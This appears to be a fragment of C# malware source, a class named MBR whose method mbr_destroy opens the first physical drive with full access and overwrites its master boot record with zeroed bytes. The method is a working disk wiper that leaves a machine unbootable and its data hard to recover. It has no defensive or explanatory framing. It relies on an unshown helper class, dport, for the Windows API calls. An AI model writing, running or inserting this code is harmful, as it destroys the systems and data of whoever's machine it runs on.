using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace AlexRealm
{
    public class MBR
    {
        public static void mbr_destroy()
        {
            var mbrData = new byte[dport.MbrSize];
            var mbr = dport.CreateFile("\\\\.\\PhysicalDrive0", dport.GenericAll, dport.FileShareRead | dport.FileShareWrite, IntPtr.Zero, dport.OpenExisting, 0, IntPtr.Zero);
            dport.WriteFile(mbr, mbrData, dport.MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}